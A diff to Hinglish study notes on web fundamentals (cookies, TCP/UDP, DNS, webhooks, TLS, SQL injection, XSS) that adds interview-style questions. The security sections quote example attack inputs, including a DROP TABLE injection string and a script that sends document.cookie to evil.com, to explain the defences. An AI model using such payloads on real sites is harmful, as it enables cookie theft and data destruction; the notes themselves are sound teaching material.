@@ -75,6 +75,7 @@ Content-Type: application/json
 Cookie flags: **`HttpOnly`** (JS se chhupao), **`Secure`** (sirf HTTPS), **`SameSite`** (cross-site requests pe bhejo ya nahi — Strict/Lax/None), `Domain`, `Path`, `Expires`/`Max-Age`.
 
 ## TCP vs UDP
+? TCP aur UDP mein farak kya hai? Kab kaunsa use hota hai?
 | | TCP | UDP |
 | --- | --- | --- |
 | Connection | Pehle handshake (connection-oriented) | Seedha bhejo (connectionless) |
@@ -97,6 +98,7 @@ DNS = internet ki phone book: naam → IP. Resolution chain: browser/OS cache �
 | **NS** | Is domain ke nameservers kaun hain |
 
 ## Webhook vs API polling
+? Webhook aur polling mein farak kya hai? Webhook receive karte waqt kya dhyan rakhoge?
 **Polling** — tum baar-baar server se poochhte ho "kuch naya hua?" (har 10 second GET). Simple, par zyada requests bekaar jaati hain aur update mein delay.
 
 **Webhook** — ulta: jab event hota hai, **server tumhare URL pe HTTP POST** kar deta hai ("payment success hua"). Real-time aur efficient. Payment gateways (Razorpay, Stripe), GitHub, SMS providers yahi karte hain.
@@ -158,6 +160,7 @@ Asymmetric crypto sirf shuru mein (identity + key agreement), baaki symmetric �
 **Certificate expire** ho jaaye to browser warning, API clients fail — isliye Let's Encrypt + auto-renew (certbot timer). TLS 1.0/1.1 purane aur insecure — minimum 1.2.
 
 ## SQL injection aur bachav
+? SQL injection kya hai aur .NET mein isse kaise bachoge?
 **Kya hai**: user input seedha SQL string mein joda gaya to attacker input mein SQL likh ke query badal deta hai.
 
 Input `' OR '1'='1` → `WHERE name = '' OR '1'='1'` → saari rows. Ya `'; DROP TABLE users; --`.
@@ -182,6 +185,7 @@ var users = db.Users.FromSql($"SELECT * FROM users WHERE name = {name}").ToList(
 ```
 
 ## XSS — Cross-Site Scripting
+? XSS kya hai aur Angular isse kaise bachata hai?
 **Kya hai**: attacker tumhare page pe apni **JavaScript** chalwa deta hai — jaise comment mein `<script>fetch('evil.com?c='+document.cookie)</script>` daala, aur jo bhi page khole uske browser mein chal gaya. Token/cookie chori, user ki taraf se actions.
 
 Types: **Stored** (DB mein save, sabko dikhe — sabse khatarnak), **Reflected** (URL parameter se turant page pe), **DOM-based** (client JS khud unsafe tareeke se DOM mein daale).
